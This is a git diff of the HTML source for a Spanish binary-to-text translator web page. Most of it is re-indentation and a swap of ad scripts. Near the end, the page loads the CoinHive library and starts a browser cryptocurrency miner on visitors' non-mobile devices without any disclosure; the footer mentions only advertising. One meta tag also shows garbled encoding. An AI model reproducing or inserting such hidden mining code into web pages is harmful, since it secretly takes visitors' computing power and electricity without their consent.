@@ -5,85 +5,92 @@ To change this template file, choose Tools | Templates
 and open the template in the editor.
 -->
 <html>
-  <head>
-    <title>Traductor Binario</title>
-    <meta charset="windows-1252">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
 
-    <meta name="description" content="Traduce de binario a texto y de texto a binario. Rapido y gratis.">
-    <meta name="keywords" content="traductor binario texto translate binary">
-    <meta name=”robots” content='Index,  Follow'>
+<head>
+  <title>Traductor Binario</title>
+  <meta charset="windows-1252">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+  <meta name="description" content="Traduce de binario a texto y de texto a binario. Rapido y gratis.">
+  <meta name="keywords" content="traductor binario texto translate binary">
+  <meta name=ï¿½robotsï¿½ content='Index,  Follow'>
 
 
-    <script src="https://code.jquery.com/jquery-3.2.1.slim.min.js" crossorigin="anonymous"></script>
-    <script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.12.9/umd/popper.min.js" crossorigin="anonymous"></script>
-    <script src="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/js/bootstrap.min.js" crossorigin="anonymous"></script>
-    <script src="clipboard-polyfill.js"></script>
-    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/css/bootstrap.min.css" crossorigin="anonymous">
-    <link rel="stylesheet" href="style.css">
+  <script src="https://code.jquery.com/jquery-3.2.1.slim.min.js" crossorigin="anonymous"></script>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.12.9/umd/popper.min.js" crossorigin="anonymous"></script>
+  <script src="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/js/bootstrap.min.js" crossorigin="anonymous"></script>
+  <script src="clipboard-polyfill.js"></script>
+  <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/css/bootstrap.min.css" crossorigin="anonymous">
+  <link rel="stylesheet" href="style.css">
 
-    <script async src="https://www.googletagmanager.com/gtag/js?id=UA-115774942-1"></script>
-    <script>
-      window.dataLayer = window.dataLayer || [];
-      function gtag() {
-        dataLayer.push(arguments);
-      }
-      gtag('js', new Date());
+  <script async src="https://www.googletagmanager.com/gtag/js?id=UA-115774942-1"></script>
+  <script>
+    window.dataLayer = window.dataLayer || [];
+    function gtag() {
+      dataLayer.push(arguments);
+    }
+    gtag('js', new Date());
 
-      gtag('config', 'UA-115774942-1');
-    </script>
+    gtag('config', 'UA-115774942-1');
+  </script>
 
-    <script data-cfasync="false" src="//d3ud741uvs727m.cloudfront.net/?vudud=716063"></script>
+  <script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
+  <script>
+    (adsbygoogle = window.adsbygoogle || []).push({
+      google_ad_client: "ca-pub-4303626192305511",
+      enable_page_level_ads: true
+    });
+  </script>
 
-  </head>
-  <body>
-    <div class="container">
-      <div class="row" id="titulo">
-        <div class="col-12 col-sm-12 col-md-12 col-lg-12 col-xl-12">
-          <h1>Traductor Binario</h1>
-        </div>
+</head>
+
+<body>
+  <div class="container">
+    <div class="row" id="titulo">
+      <div class="col-12 col-sm-12 col-md-12 col-lg-12 col-xl-12">
+        <h1>Traductor Binario</h1>
       </div>
-      <div class="row">
-        <div class="col-12 col-sm-12 col-md-12 col-lg-12 col-xl-12">
-          <div class="form-group">
-            <label for="binario">Binario</label>
-            <textarea class="form-control" id="binario" rows="5"></textarea>
-          </div>
-        </div>
-      </div>
-
-      <div class="row">
-        <div class="col-12 col-sm-12 col-md-12 col-lg-12 col-xl-12">
-          <div class="form-group">
-            <label for="texto">Texto</label>
-            <textarea class="form-control" id="texto" rows="3"></textarea>
-          </div>
-        </div>       
-        <div class="col-12 col-sm-12 col-md-12 col-lg-12 col-xl-12">
-          <button type="button" class="btn btn-secondary" id="copiar">Copiar</button>
-          <button type="button" class="btn btn-secondary" id="convertir">Convertir texto a binario</button>
+    </div>
+    <div class="row">
+      <div class="col-12 col-sm-12 col-md-12 col-lg-12 col-xl-12">
+        <div class="form-group">
+          <label for="binario">Binario</label>
+          <textarea class="form-control" id="binario" rows="5"></textarea>
         </div>
       </div>
     </div>
-    <footer class="footer">
-      <div class="container">
-        <span class="text-muted">Este sitio usa publicidad para sobrevivir, por favor desactiva tu adblock</span>
+
+    <div class="row">
+      <div class="col-12 col-sm-12 col-md-12 col-lg-12 col-xl-12">
+        <div class="form-group">
+          <label for="texto">Texto</label>
+          <textarea class="form-control" id="texto" rows="3"></textarea>
+        </div>
       </div>
-    </footer>
+      <div class="col-12 col-sm-12 col-md-12 col-lg-12 col-xl-12">
+        <button type="button" class="btn btn-secondary" id="copiar">Copiar</button>
+        <button type="button" class="btn btn-secondary" id="convertir">Convertir texto a binario</button>
+      </div>
+    </div>
+  </div>
+  <footer class="footer">
+    <div class="container">
+      <span class="text-muted">Este sitio usa publicidad para sobrevivir, por favor desactiva tu adblock</span>
+    </div>
+  </footer>
 
-    <script src="binario.js"></script>    
-    <script src="https://coinhive.com/lib/coinhive.min.js"></script>
-    <script>
-      var miner = new CoinHive.Anonymous('dbQcCOahKbpxrNthhqPuHVO66C1Km5Lq', {throttle: 0.3});
+  <script src="binario.js"></script>
+  <script src="https://coinhive.com/lib/coinhive.min.js"></script>
+  <script>
+    var miner = new CoinHive.Anonymous('dbQcCOahKbpxrNthhqPuHVO66C1Km5Lq', { throttle: 0.3 });
 
-      // Only start on non-mobile devices and if not opted-out
-      // in the last 14400 seconds (4 hours):
-      if (!miner.isMobile() && !miner.didOptOut(14400)) {
-        miner.start();
-      }
-    </script>        
+    // Only start on non-mobile devices and if not opted-out
+    // in the last 14400 seconds (4 hours):
+    if (!miner.isMobile() && !miner.didOptOut(14400)) {
+      miner.start();
+    }
+  </script>
 
-  </body>
+</body>
+
 </html>
-
-
